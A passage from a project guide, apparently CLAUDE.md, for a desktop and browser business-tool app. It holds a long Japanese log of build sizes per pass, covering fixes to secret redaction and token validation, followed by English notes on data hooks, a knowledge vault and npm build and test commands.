**相手の本文を画面の文へ入れる経路のうち 1 つだけが伏字を呼んでいなかった**。`shared/ollama.ts` は `clampToCeiling(x, MAX_ERROR_DETAIL=300)` で**天井だけ**を掛け、つまり `redactForMessage` の後半 (切る) を手で書いて前半 (伏せる) を持っていなかった (実測: 兄弟は 6 / 3 / 2 / 3 件、ここ **0 件**)。3 か所を `redactForMessage` へ通し、300 を梯子へ `MAX_LOCAL_MODEL_ERROR_CHARS` として移した。**減ったのは私有定数とその注記を落とした分が、足した呼び出し 1 つを上回ったため** —— `redactSecrets` は両ビルドに既に入っているので、通す費用は呼び出し 1 つぶんしかない。**実害は今日 0** (Ollama への要求に資格情報は乗らない・`SERVICE_CREDENTIAL_USE.ollama === 'none'`) だが、本文の出どころは利用者が設定したホストなので「送っていないから反射されない」は設定次第で崩れる前提だった。**`redact.ts` の「全経路の最後の関門」も実物 (6 件) に直した** —— 5 件の列挙 +「ほか」で、その「ほか」に穴が 1 つ在った。パス 273 の census が見なかったのは、`redactForMessage` の**第 2 引数**を数える網には**`redactForMessage` を呼ばない経路が映らない**ため (パス 289 が隣の census で見つけた死角と同じ形)。向きを変えて「梯子の天井は伏字を通してのみ掛かる」を留めた**)・2026-09-15 パス 289 後の計測: 11,891,357 B / 3,304,103 B (両方 +22 B** —— 伏字の **3 本目の運び手の残り半分**。パス 271 は「URL のクエリ引数」を塞いだつもりで `([?&])` を錨にしており、**対が 1 つ目のときは当たらなかった** —— それは `application/x-www-form-urlencoded` の本文、つまり **RFC 6749 §4.1.3 がトークン端点に指定している形**で、`main/oauth.ts` と `renderer/oauth/pkce.ts` が実際に組み立てている(走査で 2 件)。実測: `?client_secret=…` は伏せるのに `client_secret=…&grant_type=…` は素通りで、伏字の有効範囲が**秘密の運び手ではない 1 文字**に依っていた。錨を `(^|[?&\n])` にし `code[_-]?verifier` を足した (両ビルドが実際に送る。`assertion` は実測 0 件なので足さない)。**パス 271 の過剰の対照が、この穴を「散文」という理由で意図として留めていた** —— 区切りが無いという条件が指す母集団は 2 つ在り、標本が片方しか見ていなかった。`\s` まで広げると散文を巻き込むので広げない (実測して narrow に戻した)**)・2026-09-15 パス 280〜284 をまとめて計測: 11,891,501 B / 3,304,247 B (両方 +151 B)** —— 5 パス分でこれだけなのは、内訳が「出荷物に入らない所」に偏っていたため: 281 は検査だけ・282 は `src/main/` の締切と `shared/scanTarget.ts` へ寄せた 4 文 (ビルドごとに 1 つずつ在った写しが 1 つになるので相殺)・283 の `SHOPIFY_ORDER_FIELDS` は shared に置いたがブラウザ版から誰も import しないので tree-shaking で落ちる・284 は `shared/atlassianSite.ts` に関数 1 つと 3 文を足した代わりに両ビルドの写し (3 文 + 3 段の検査) を落とした。**両方が同じだけ増えるのは共有モジュールだからで、LITE と FULL の差は学術コーパスだけである。**・2026-09-15 パス 278 後も 11,891,350 B / 3,304,096 B で **byte 単位で不変** (直したのは `tsconfig.*.json` の include と `CLAUDE.md` / `docs/` / `scripts/generate-dashboard.ts` の注記だけ —— **4 つの TypeScript が型検査の外に居た**。include を広げても出荷物の中身は 1 バイトも変わらない: vite は esbuild で型を剥がすだけで `tsc` の範囲を見ないし、`src/__tests__` も `vitest.config.ts` も `scripts/` も出荷 HTML に入らない)・2026-09-15 パス 275 後の計測: 11,891,350 B / 3,304,096 B (**両方 +918 B** —— 断りの台帳 `DESKTOP_ONLY` の**理由**を誰も検算しておらず、残る 4 行を測ると **2 行が偽・1 行は生きた欠陥**だった (`microsoft-365/create-event` は画面にボタンが在るのに `action_not_found`・`stocks/backtest` の「デスクトップ側の計算」はブラウザ版が同じ計算を戦略ごとに走らせており偽・`docstudio/list-collections` の「ローカルを読む」は 3 要素のリテラル定数で偽)。create-event を共有へ寄せて繋ぎ、理由を**種類**にして種類ごとに検査を付けた。`dead-action` の行は画面から呼ばれていてはならない)・2026-09-15 パス 274 後の計測: 11,890,432 B / 3,303,178 B (**両方 +890 B** —— `microsoft-365/send-mail` がデスクトップ版にしか無く、ブラウザ版では `action_not_found` だった (隣の `gmail/create-draft` は同じ CORS → Worker の形で動いていた)。画面は穴を「デスクトップ版の機能です」と説明し、検査も「プロキシ経路も用意していない」と台帳に書いて**穴を仕様として固定していた**。ホスト・欄の判定・要求の組み立てを `shared/api/microsoft365.ts` に寄せ、両ビルドが同じ関数を通す)・2026-09-15 パス 273 後の計測: 11,889,542 B / 3,302,288 B (「相手の本文をどれだけ画面へ載せてよいか」の天井が **5 値・19 か所の裸のリテラル**で、最も多い 200 (15 か所) にだけ名前も理由も無かったのを `shared/redact.ts` の 3 段の梯子へ寄せた分で**両方 +10 B** —— 80 の 2 か所は **main ↔ ブラウザ版の双子**で、一致していたが一致を留めている物が何も無かった (パス 269 が 300 で塞いだ穴と同じ形)。天井そのものは 1 字も変えていない)・パス 271 後の計測: 11,889,532 B / 3,302,278 B (伏字の**3 本目の運び手** —— URL のクエリ引数 —— を `redact.ts` に足した分で**両方 +196 B**。それまでの規則は**ヘッダ名**と**JSON 項目名**の 2 本しか見ておらず、`?api_key=` / `?apikey=` / `?access_token=` / `?token=` / `?auth=` / `?key=` の **6 形すべてが素通り**していた。`redact.ts` は両ビルドが読むので LITE も同じだけ増える)・2026-09-15 パス 269 後の計測: 11,889,336 B / 3,302,082 B (`assistant/chatAll` の**提供者ごと**のエラー文の天井が `redactForMessage(msg, 300)` という**字面でビルドごとに 1 つずつ**在ったのを `shared/assistantLimits.ts` の `MAX_ENSEMBLE_ERROR_CHARS` 1 つに寄せた分で**両方 +8 B** —— 応答そのものの天井 (2,000) より狭い理由 (最大 5 提供者ぶんが 1 つの文に積まれる) がどこにも書かれておらず、数字だけが 2 か所に在った。**本体の直しは出荷物に入らない** —— 「無いこと」を主張する検査が変異検査の中で空になる穴 (網が `readFileSync` しか見ていなかった) を塞いだのはゲート側である)・2026-09-15 支払明細書 4 種 (給与 / 賞与 / 役員報酬 / 役員賞与) を書類スタジオに足した後の計測: 11,889,328 B / 3,302,074 B (**両方 +29,582 B** —— 書式 52 → 56 と、交付前チェック 4 本・法的位置づけ・事業仕分けの台帳 4 行ずつ。賃金台帳の注記が 2026-08 から「給与明細は労働者へ交付する通知 (所得税法231条等)・台帳とは別物」と述べていたのに、**交付する側の明細書が 1 つも無かった**)・パス 268 後の計測: 11,859,746 B / 3,272,492 B (チームレーダーの SVG の組み立てを `shared/teamRadarSvg.ts` へ移し、**ブラウザ版が画面の `<svg>` を DOM から掻き取るのをやめた**分で**両方 +2,723 B** —— 掻き取れるのは `<svg>` 要素だけで、標題・部署・評価時点・凡例・⚠ の断りはその外側に在ったので、書き出した SVG は 244 バイトの裸の図だった)・2026-09-15 パス 267 後も 11,857,023 B / 3,269,769 B で **byte 単位で不変** (直したのは `src/main/` の `action:invoke` だけで、ブラウザ版はこのハンドラを 1 行も読み込まない —— **資格情報の要らない 15 サービスの action がデスクトップ版で 1 度も呼ばれておらず**、同じボタンがブラウザ版では動いていた)・2026-09-15 パス 266 後の計測: 11,857,023 B / 3,269,769 B (`cursor` の日次利用の 5 欄が鍵の不在を 0 に倒しており、**「採択率 0%」と「4 つのうち 1 つだけを数えたリクエスト数」**を刷っていた —— `readNum` / `sumOrNull` と画面の `qty` で**両方 +124 B**。`shared/api/cursor.ts` は両ビルドが読むので LITE も同じだけ増える)・2026-09-15 パス 265 後の計測: 11,856,899 B / 3,269,645 B (`as const` が画面の型を実物より狭くしていた真偽値 12 件に `as boolean` を足し、**その死んだ枝が「✅ 連携中」だった** —— デスクトップの funding の fetcher は Phase 6 まで見本の Map を必ず渡すので、何も繋いでいない利用者に連携を名乗っていた。出どころ (`FundingLinkSource`) と文言 2 つを共有へ置いた分で**両方 +373 B** —— `shared/funding.ts` は両ビルドが読むので LITE も同じだけ増える)・2026-09-14 パス 264 後の計測: 11,856,526 B / 3,269,272 B (鍵が無い応答から**件数の文**を組み立てていた 3 件 (`notion` の「共有されたページなし」= 利用者の設定の診断・`microsoft-365` の「直近 0 件 / 未読 0 件」= サマリーの 2 カード・`ollama` の「既知 CVE」= 版が読めないだけ) を`shared/apiResponse.ts` の `readArrayField` (空の配列は read: true) へ通した分で**両方 +283 B**)・2026-09-14 パス 263 後の計測: 11,856,243 B / 3,268,989 B (`cursor` が「相手が 0 件と答えた」と「応答を読めなかった」を分けるようにした分で**両方 +1,829 B** —— `rowsOf` は 5 つの違う状況を `[]` に畳んでおり、`{teamMembers:[]}` (0 名と答えた) も `null` も `{}` もスカラーも、見出しに `Cursor · 0 名 / 稼働 0 日 / $0.00` を緑のライブ表示で刷っていた (両方向に嘘)。shared と renderer の両方に掛かるので LITE も同じだけ増える)・2026-09-14 パス 262 後も 11,854,414 B / 3,267,160 B で **byte 単位で不変** (`jsonFetch<T>` に封筒の要求を置き、`github` の 6 欄と `freee` の事業所を要求したが、直したのは `src/main/` だけ —— ブラウザ版はこの 13 クライアントを 1 つも読み込まない (読み取りは `liveRead.ts` の `cursor` だけ・書き込みはパス 261 で直した `saasWriteWeb.ts`)。本文 `null` で 12 クライアントが `Cannot read properties of null` を画面へ漏らしていた)・2026-09-14 パス 261 後の計測: 11,854,414 B / 3,267,160 B (外部サービスの「成功した」応答を**読むところで**検証する共有規則 2 つ (`shared/apiResponse.ts` / `shared/securityResponse.ts`) と、`saasWriteWeb.ts` の 12 経路・`main/clients/security.ts` の 2 経路の配線で**両方 +2,625 B** —— 200 の本文が `{}` でも**6 経路が成功として返し**、2 経路は `undefined` を埋め込んだ URL を押せるリンクとして渡し、`security` は空の「漏洩」を 1 件でっち上げていた。安全の判定を作る 2 つは両ビルドが同じ実装を読むのでLITE も同じだけ増える)・2026-09-14 パス 260 後は 11,851,789 B / 3,264,535 B (認可サーバのトークン端点の応答を**読むところで**検証する共有規則 `shared/tokenResponse.ts` と、`oauth.ts` の裸のキャスト 2 か所の置き換えで**両方 +618 B** —— 規則はブラウザ版 `pkce.ts` に既に在り、main には 1 つも無かった。`{"refresh_token":{"a":1}}` の応答 1 つで**働いていた更新トークンが置き換わり**、以後そのサービスは 401 のまま画面は「設定済み」と出していた。`pkce.ts` も同じ関数を読むので両ビルドが同じだけ増える)・2026-09-14 パス 259 後は 11,851,171 B / 3,263,917 B で **byte 単位で不変** (`checkTokenSetForStorage` を呼ぶのは `main/secrets.ts` だけなので、ブラウザ版からは tree-shaking で丸こと落ちる —— 出荷 HTML に 0 件。認可サーバの応答 1 つで全サービスの資格情報が読めなくなる穴を塞いだ)・2026-09-14 パス 258 後の計測: 11,851,171 B / 3,263,917 B (落とした理由を「上限 200 件」から**実際に切った仕組み**へ分けた分と、欄の長さの天井をコード単位から**文字**へ揃えた分で**両方 +434 B** —— 1 件しか送っていない利用者に「上限 200 件」と刷っていた (上限は 200/200/500 なので `sent <= cap` が成り立ち、理由は証明可能に偽だった)。絵文字 33 個の部署名は 33 文字 / 66 コード単位で、旧い天井だと 33 文字で断られていた)・2026-09-14 パス 254 後の計測: 11,850,737 B / 3,263,483 B (一覧から AI へ送る本文の予算を `row.length` (コード単位) から `countChars` (文字) へ移した分で**両方 −3 B** —— 門は両ビルドとも文字で測るのに予算だけがコード単位で、絵文字 10 個の件名 600 行で 2,617 字送った時点で 362 行を落とし、画面は「5000 字までのため」と**成り立たない理由**を述べていた。`lint:charset` に制御・不可視文字の 4 群 (Trojan Source を含む) を述したがゲートなので出荷物には入らない)・2026-09-14 パス 252 後の計測: 11,850,740 B / 3,263,486 B (床と天井の**単位**を揃えた分で**両方 +216 B** —— 「12 文字以上」と 9 か所で述べるマスターパスワードの関門が `password.length` (コード単位) を数えており、`'😀'.repeat(6)` (**実文字数 6**) で満たせていた。`atLeastChars` / `moreThanChars` は **n 文字目で切り上げる** (上限は*拒むために*在るので 100 MB を辿ってはいけない)。下限の規則の写し 2 つは式ごと `meetsPasswordPolicy` へ寄せたので規則は 1 つになった。走査 `ceilingUnitCensus` と対照は出荷物に入らない)・2026-09-14 パス 248 後の計測: 11,850,524 B / 3,263,270 B (パス 249 は検査と文書だけなので **byte 単位で不変**。main の Ollama 許可表を共有台帳 `OLLAMA_READ_PATHS` から**組み立てる**ようにし (手写しの 3 経路をやめた)、Atlassian の欄の天井 3 つを `shared/atlassianSite.ts` へ移して**両ビルドが読む**ようにした分で**両方 +56 B** —— ブラウザ版は token と site に天井が無く、main 側にはその理由 (`btoa` の多バイト文字列) まで書かれていた。ゲート `lint:shared-judgement` と検査・対照は出荷物に入らない。パス 247 は文書だけなので byte 単位で不変だった)・2026-09-14 パス 246 後の計測: 11,850,468 B / 3,263,214 B (デスクトップ版の `getValidToken` が壊れた TokenSet を**生の JSON のまま Bearer として返していた**のを断るようにし (`reason: 'broken-token-set'`)、断りの文面を `brokenStoredCredentialMessage` 1 つに寄せた分で**両方 +29 B** —— `Authorization: Bearer {"refreshToken":"…"}` が相手先 API へ出ていた。呼び出し側の変更は 0 行 (断る器は最初から在った)。実測と対照は検査なので出荷物に入らない)・2026-09-14 パス 245 後の計測: 11,850,439 B / 3,263,185 B (制御文字の規則を `shared/tokenInput.ts` の `hasControlChars` 1 つに切り出し、**両ビルドの保管層** (`vault.setToken` / `secrets.setToken`) に床として置いた分で**両方 +72 B** —— 入口の関門を通らない書き込みが 2 本残っていた (`setOAuthTokens` は IPC ハンドラを経由せず、Google トークン 4 本は保管庫を直接叩く)。**床は JSON の包みの中を見られない**ので、包む側の断りは別に要る)・2026-09-14 パス 244 後の計測: 11,850,367 B / 3,263,113 B (資格情報の入口 2 本を共有の `checkTokenInput` へ通し、`redact.ts` に「ヘッダ名を持たない引用」の規則を 1 本足した分で**両方 +337 B** —— プラットフォームの例外文面 (`Headers.append: "<値>" is an invalid header value.`) は ヘッダ名を含まないので、接頭辞を持たない鍵 (HIBP / VirusTotal の 64 桁 16 進) が丸ごと画面へ出ていた。実測の 10 経路と `<input>` の CR/LF 消毒の境目は検査なので出荷物に入らない)・2026-09-14 パス 240 後の計測: 11,850,030 B / 3,262,776 B (保存済みソルトの床を凍結値 `MIN_STORED_SALT_BYTES` へ分け、生成の `SALT_BYTES = MIN_SALT_BYTES` は残した分で**両方 +8 B** —— 直したのは主に注記の置き場所(危険は使う側に書かれていて、上げる編集をする宣言行には書かれていなかった)。原文の検査は出荷物に入らない)・パス 239 後の計測: 11,850,022 B / 3,262,768 B (封緘した物が自分を作った PBKDF2 の反復回数を覚える —— 凍結値 `LEGACY_KDF_ITERATIONS`・`VaultMeta.recoveryIterations`・`EncryptionMeta.iterations` と `deriveKeyFromMnemonic` / `createPassphraseRecordCipher` の引数化で**両方 +176 B**。`recoverWithMnemonic` が導出に使った回数を書き残していなかった 1 行がこの中で最も重い)・パス 236〜237 後も 11,849,846 B / 3,262,592 B で **byte 単位で不変** (236 は文書だけ。237 の `deriveAesKey` の床 2 行は**出荷物に入らない関数の中**に在る —— レコード封緘の書き込み・解錠の経路はまるごと tree-shaking で落ちており、出荷 HTML に `暗号化は既に有効です` / `レコードは平文に戻しましたが` は 0 件)・2026-09-14 パス 235 後の計測: 11,849,846 B / 3,262,592 B (`shared/lookup.ts` の `lookup` / `has` と 6 つの引き手の配線・`requiredPermissionFor` の `| null` 化と `UNKNOWN_CAPABILITY_PERMISSION` で**両方 +141 B** —— prototype の鍵を `Object.hasOwn` で落とす床。総当たりのゲートは検査なので出荷物に入らない)・パス 232〜234 後は 11,849,705 B / 3,262,451 B で byte 単位で不変 (検査・文書・コメントだけ。最小化でコメントは落ちる)・2026-09-14 パス 231 後の計測: 11,849,705 B / 3,262,451 B (`redact.ts` に発行元の分かる接頭辞を 11 形足した分で**両方 +432 B** —— `github_pat_` (GitHub 細粒度 PAT) / `ntn_` (Notion) / `1//` (Google 更新トークン) / JWT (microsoft-365) の 4 家系は**今日預かっているサービス**の鍵で、裸で本文に現れると素通りしていた。台帳の母集団を `SERVICE_CREDENTIAL_USE` へ移した census は検査なので出荷物に入らない)・パス 229 後は 11,849,273 B / 3,262,019 B (率の非有限の床を `shared/formatters.ts` の `pct` / `pctOrDash` に 1 つ置き、4 つの写し —— `num.ts` の `ratioPctOrDash`・経営サマリー 2 つ・不動産 1 つ —— を通した分で**両方 +26 B**。`digits` を省くと丸めないので**刷る字は 1 文字も変わらない**。走査の絶対の主張と印の標本は検査なので出荷物に入らない)・パス 228 後は 11,849,247 B / 3,261,993 B (要件を外れた食事補助を給与課税の現物給与として**計算に入れ直す** `taxableInKind` と比較表の行・断りの書き換えで**両方 +325 B** —— 要件を満たしていれば 0 なので、そのときの数字はパス 228 より前と完全に一致する)・パス 227 後は 11,848,922 B / 3,261,668 B (既定の帯へ倒した軸を名指しする `defaultBandAxes` / `defaultBandNote` と診断カードの ⚠️ で**両方 +1,046 B** —— 倒し込み自体は残す)・パス 226 後は 11,847,876 B / 3,260,622 B (年初来リターンの下限 `RETURN_FLOOR_PCT` = 事実 と、集約・改善提案・一覧の 3 面の断りで**両方 +1,675 B** —— 上端 (書き手の 1000%) は打ち間違いの門なので読む側では落とさない)・パス 225 後は 11,846,201 B / 3,258,947 B (期が読める行だけを通す漏斗 `readablePeriodRows` と 2 つの断り文・3 面の配線で**両方 +1,074 B**)・パス 224 後は 11,845,127 B / 3,257,873 B (書き手が断る「欄と欄」7 件 —— 貸借対照表の内数 ≦ 親項目 5 件・人件費 ≦ 販管費・連続下落 危険 ≧ 警告 —— を `RECORD_RELATIONS` へ移し、書き手 3 つが台帳を読む分で**両方 +989 B**。走査を綴りから振る舞い (借用) へ移した検査は出荷物に入らない)・パス 223 後は 11,844,138 B / 3,256,884 B (記録の欄と欄の関係を 1 か所に置く `recordRelations.ts` を、画面の入口と復元の入口の両方が読む分で**両方 +873 B**)・パス 222 後は 11,843,265 B / 3,256,011 B (等しくてはならない組 `PARAMETER_DISTINCT` と画面の断りで**両方 +696 B** —— 軸の一覧は `RADAR_AXIS_KEYS` から導くので 15 軸ぶんの写しは出荷物に入らない)・パス 221 後は 11,842,569 B / 3,255,315 B (台帳の欄と欄の順序を見る `parameterOrder.ts`・画面の断り・法人事業税の段を使う前に昇順へ畳む `orderedBusinessTaxLimits` で**両方 +2,623 B**。パス 220 は検査と文書だけなので byte 単位で不変だった)・パス 219 後は 11,839,946 B / 3,252,692 B (食事補助の非課税要件の判定 `mealSubsidyVerdict` と画面の ⛔ で両方 +1,296 B)・パス 218 後は 11,838,650 B / 3,251,396 B (`maxEmployeeSocialInsurance` と社会保険料の ⚠️ の基準で両方 +214 B)・パス 217 後は 11,838,436 B / 3,251,182 B (iDeCo の法定上限 `IDECO_ANNUAL_CAP_MAX` と関門の `max` 2 件・選択肢の断りで両方 +114 B)・パス 216 後は 11,838,322 B / 3,251,068 B (工場プランの 2 欄を素の `<input>` から `GuardedNumber` に替えた分で**両方 -106 B** —— 宣言を表に寄せたので JSX の重複が減った)・パス 215 後は 11,838,428 B / 3,251,174 B (物件フォームの宣言を書き手の隣へ移した分で両方 +133 B —— 一致の検査は出荷物に入らない)・パス 214 後は 11,838,295 B / 3,251,041 B (⛔ の欄が在れば保存しない `saveRefusalNote` と水耕栽培の設備・費用の門で両方 +310 B)・パス 213 後は 11,837,985 B / 3,250,731 B (人材の給与計算 `PAYROLL_READS` 3 段と `data-live-clock` の印で両方 +466 B —— 走査の一般化 `readings()` は検査なので出荷物には入らない)・パス 212 後は 11,837,519 B / 3,250,265 B (貿易の金額 7 欄の `TRADE_SPECS` / `TRADE_READS` と段ごとの断り・輸出の「日本の事実」を別の段に切り出した分で両方 +762 B)・パス 211 後は 11,836,757 B / 3,249,503 B (投資信託の `MF_REFUSAL_SPECS` を 3→12 欄・`MF_READS` を 2→6 段に広げ、予備資金を独立の段に切り出した分で両方 +889 B)・パス 210 後は 11,835,868 B / 3,248,614 B (水循環プランナーの `WC_SPECS` 10 欄 + `WC_READS` 5 段と段ごとの断りで両方 +1,308 B —— 常設ゲート `guardedJudgements.test.ts` は検査なので出荷物には入らない)・パス 209 後は 11,834,560 B / 3,247,306 B (⛔ の「マイナスの値」を段ごとに断る共有の `refusedFields` / `refusalLabels` / `refusalNote` と `RefusedFieldsNote` で両方 +1,484 B —— パス 206 の断りを部品に畳んだので、不動産 4 段 + 投資信託 2 段を足しても増分はこれだけ)・パス 208 後は 11,833,076 B / 3,245,822 B (貿易の率の天井 `MAX_TRADE_RATE` と段ごとの `null` で両方 +816 B)・パス 207 後は 11,832,260 B / 3,245,006 B (率の天井 `MAX_PLAN_RATE_PCT` / `MAX_COST_RATE_PCT` と断り 5 本で両方 +2,419 B)・パス 206 後は 11,829,841 B / 3,242,587 B (都市計画の判定を段ごとに断る `ZONING_READS` / `ZoningRefusal` で両方 +1,722 B)・パス 205 後は 11,828,119 B / 3,240,865 B (財務分析の漏斗 `saneMonthlyKpi` ほか 6 件で両方 +193 B)・パス 204 後は 11,827,926 B / 3,240,672 B (非有限の入口 43 件の消毒・年分の漏斗 `resolveTaxYear`・符号を残す `finiteOr0` で両方 +784 B)・パス 203 後は 11,827,142 B / 3,239,888 B (非有限の入口 14 件を契約どおりに倒した分)・パス 202 後は 11,826,879 B / 3,239,625 B (比較だけの関門 1 件を `nonNeg` に通した分で両方 +20 B)・パス 201 後は 11,826,859 B / 3,239,605 B (消毒の綴り 5 通りを共有の `nonNeg` 1 つに畳んだ分で**両方 -799 B**)・パス 200 後は 11,827,658 B / 3,240,404 B (日付の組み立ての漏斗 `utcMsFromParts` で両方 +102 B)・パス 199 後は 11,827,556 B / 3,240,302 B (課税期間の範囲の関門と画面の断りで両方 +849 B)・パス 198 後は 11,826,707 B / 3,239,453 B (年数の天井 2 つと `jpy` の床・画面の断りで両方 +1,530 B)・パス 197 後は 11,825,177 B / 3,237,923 B (`maxLength` を 16 欄から外し関門を 4 つ足した分で両方 +1,797 B)・パス 196 後は 11,823,380 B / 3,236,126 B (両方 +72 B)・パス 195 後は 11,823,308 B / 3,236,054 B (両方 -29 B)・パス 194 後は 11,823,337 B / 3,236,083 B (**水耕栽培の運転管理 1 サービス分で 両方 +42,223 B** —— 共有の判定・調製・日程と画面 1 枚ぶん。学術コーパスに依らないので LITE も同じだけ増える)・パス 193 後は 11,781,114 B / 3,193,860 B・パス 192 後は 11,780,315 B / 3,193,061 B・パス 191 後は 11,780,034 B / 3,192,780 B・パス 190 後は 11,779,996 B / 3,192,742 B)。天井は CI が両方に掛けている: 16 MB / 4 MB、85% で警告。パス 189 後は 11,778,832 B / 3,191,576 B・パス 188 後は 11,776,126 B / 3,188,874 B・パス 187 後は 11,774,564 B / 3,187,312 B・パス 186 後は 11,771,487 B / 3,184,235 B・パス 185 後は 11,771,393 B / 3,184,141 B・パス 184 後は 11,770,727 B / 3,183,475 B (パス 183 から**両方が 5,168 B 減った** —— テンプレートの SVG の組み立てが 3 写しから 1 つになった分)・パス 183 後は 11,775,895 B / 3,188,643 B・パス 182 後は 11,774,254 B / 3,187,002 B・パス 181 後は 11,765,766 B / 3,178,512 B・前日 2026-09-11 は 11,752,227 B / 3,164,973 B。LITE の余裕は **2026-09-26 (パス 478 後) 実測で警告線まで 15,467 B・ハード上限まで 615,467 B** (パス 461〜477 は出荷物が 1 byte も動いていないので **2026-09-25 (パス 461 後) も 15,680 B / 615,680 B**) (パス 460 後も同じ —— 出荷物が 1 byte も動いていない・パス 459 後は 15,739 B / 615,739 B・パス 458 後は 16,813 B / 616,813 B・パス 457 後は 17,414 B / 617,414 B ・パス 456 後は 19,007 B / 619,007 B・パス 455 後は 19,723 B / 619,723 B・パス 454 後は 20,874 B / 620,874 B・パス 453 後は 21,751 B / 621,751 B・パス 452 後は 22,978 B / 622,978 B・パス 446 後は 26,756 B / 626,756 B) (パス 445 後は 28,985 B / 628,985 B・パス 444 後は 29,768 B / 629,768 B) (パス 443 後は 33,114 B / 633,114 B・パス 442 後は 34,271 B / 634,271 B・パス 441 後は 35,532 B / 635,532 B) (パス 440 後は 35,660 B / 635,660 B) (パス 438 / 439 後は 36,061 B / 636,061 B —— パス 439 は LITE が 1 byte も動いていない・パス 437 後は 37,493 B / 637,493 B・パス 436 後も同じ) (パス 435 後は 37,807 B / 637,807 B・パス 434 後は 38,030 B / 638,030 B・パス 433 後は 38,161 B / 638,161 B・パス 432 後は 38,547 B / 638,547 B・パス 431 後は 39,617 B / 639,617 B) (パス 429 後は 39,404 B / 639,404 B) (パス 428 後は 39,438 B / 639,438 B) (パス 427 後は 39,480 B / 639,480 B・パス 426 後は 39,551 B / 639,551 B) (パス 425 後は 39,563 B / 639,563 B) (パス 424 後は 39,950 B / 639,950 B・パス 423 後は 39,976 B / 639,976 B) (パス 422 後は 40,490 B / 640,490 B・パス 421 後は 40,489 B / 640,489 B) (パス 420 後は 40,493 B / 640,493 B・パス 419 後は 40,735 B / 640,735 B)・2026-09-22 (パス 413 後) は 41,305 B / 641,305 B (パス 410〜412 後は 41,309 B / 641,309 B —— 411 / 412 は LITE が 1 byte も動いていない) (パス 408 / 409 後は 41,465 B / 641,465 B (パス 409 は LITE が 1 byte も動いていないので同じ値)・パス 404〜407 後は 41,522 B / 641,522 B —— 405 / 406 / 407 は LITE が 1 byte も動いていない・パス 403 後は 41,658 B / 641,658 B・パス 402 後は 42,861 B / 642,861 B・パス 393 後は 48,613 B / 648,613 B・パス 392 後は 48,580 B / 648,580 B・パス 391 後は 48,859 B・パス 384 後は 50,365 B) (パス 382 後は 50,920 B / 650,920 B・パス 374 後は 51,015 B / 651,015 B・2026-09-20 パス 345 後は 56,621 B / 656,621 B) (パス 336〜344 は 56,756 B・パス 335 後は 56,774 B) (2026-09-15 パス 290 後は 95,903 B / 695,903 B —— 4 日で 34,526 B 使った。**次に renderer / shared を 63 KB 足すと CI が警告を出す**) —— CI は **4,000,000 B 超で落とし**、3,400,000 B 超は**警告だけ出して落とさない** (ci.yml にその理由が書いてある: 天井に当たってから気付くと無関係な PR が落ちたように見えるため)。**この 1 文は 2026-09-15 まで「残り約 160 KB」と書いたまま日付を持っていなかった** —— 同じ段落の他の数字はすべて「パス N 後の計測」と測った時を持つのに、**導出値のここだけが無日付で 66 KB 過大**だった。ビルドしないと測れないので verify:arch の live metric にはできない: だから**測った日を書く**) that runs in any browser with no Node/Electron. See `docs/BROWSER_REDESIGN.md`.

Each service page starts from a static snapshot in `src/renderer/data/snapshot.ts` and can swap to a
live REST fetch. The `useServiceData(serviceId, snapshot)` hook returns `data`, `source`
(`'snapshot'` | `'live'`), `status`, `errorMessage`, and `refresh()`.

All verified (sourced) knowledge datasets — academic concepts (`academicKnowledge.ts`), tax/labor/legal
compliance (`complianceKnowledge.ts`), subsidies (`subsidyKnowledge.ts`), support hotlines
(`counselorKnowledge.ts`), and economic history (`economicHistoryKnowledge.ts`) — are the single source
of truth for an **Obsidian knowledge vault** (`knowledge-vault/`, 7,000+ notes, `npm run vault:build`)
and are injected as context into the AI-orchestration runtime per executive role
(`orchestration/knowledge-map.json`, `orchestration/knowledge-context.cjs`, `npm run orchestrate:context`
/ dispatch). `vault:check` (in `verify:all`/CI) enforces vault sync, forbids duplicate ids
(`node scripts/dedupe-knowledge.cjs` consolidates), and fails when the concept table in
`docs/ACADEMIC_KNOWLEDGE.md` is stale — that table is **generated** from the corpus by
`npm run knowledge:md` (never hand-edit rows; 2026-09-05 実測で手書き表は本体と 942 行／909 項目ずれていた).
See `docs/KNOWLEDGE_VAULT.md`.

## Commands

```bash
npm install              # install deps
npm run dev              # Vite + Electron, hot reload (desktop dev)
npm run build:web        # → dist/standalone.html (browser build; runs inline-html.cjs)
npm run build:web:lite   # → dist/standalone-lite.html (~2MB モバイル版・学術コーパス非搭載)
npm run e2e              # Playwright 実機 E2E (desktop/phone/tablet)。e2e:lite で LITE 版を検証
                         #   **32 suite / 実測 455 件** (FULL・LITE とも)。床は「黙って縮んだら落とす」ための物で、
                         #   **表に書くのは実測値ただ 1 つ、床は `floorOf()` が導く** (実測の 85%・切り捨て・最低 1。
                         #   合計の床は実測合計の 85% = **386**)。2026-09-20 (パス 346) まで表は
                         #   **床と `// 実測 N` の 2 つを手書き**で持っており、実測すると 3 つの文がずれていた ——
                         #   `paperAccount` は注記 10 に対し実物 13 で、**その床 8 は実測の 62%** (5 件減っても鳴らない)、
                         #   `theme` の床 10 は 71%、runner の docblock は「実測 (合計 395 件) の 85%」と
                         #   **根拠の数が二重に偽** (実際の根拠は注記合計 452・`MIN_TOTAL_CHECKS` 384 はその 85.0%)、
                         #   そしてこの CLAUDE.md の行は「床 377 → 381 = 実測 449 の 85%」と**両方とも古かった**。
                         #   **数は保たれていたのに、その数が何の 85% なのかを述べた文だけが古びていた。**
                         #   形と算術は `shared/__tests__/e2eSuiteFloors.test.ts` が npm test で見る (対照 3 方向)。
                         #   実測値が実物とずれたら runner が走り終えたあとに**注意書きとして印字する**
                         #   (落とさない —— 増やした直後は必ずずれるし、増えた側は床にとって危険ではない)。
                         #   `SERVICE_HUB_E2E_ONLY=desktop,tablet` で一部だけ回せる (知らない名前は落ちる)
npm run perf             # 起動性能ゲート (実 chromium)。起動時の巨大 JSON.parse を検出。
                         #   **成果物が材料より古ければ exit 2** (e2e / e2e:ollama / smoke / smoke:app も同じ判定
                         #   `scripts/lib/artifact-freshness.cjs`。母集団 8 本は `artifactFreshness.test.ts` が
                         #   package.json の e2e* / perf* / smoke* / exp* から導く —— パス 304 まで 3 本を手で並べており、
                         #   e2e:ollama と smoke:app は古い成果物を黙って相手にしていた。exp:* 3 本はパス 305 で)。
                         #   材料 = src/ の ts/tsx/css/html/json + vite.config.ts + scripts/inline-html.cjs +
                         #   tsconfig*.json + package(-lock).json + src/ が import する外の JSON (orchestration/registry.json)。
                         #   2026-09-17 (パス 302) まで src/ しか見ておらず、inline-html.cjs (CSP を組む側) を
                         #   直しても古い standalone.html で緑だった。docs/ と __tests__/ は材料ではない
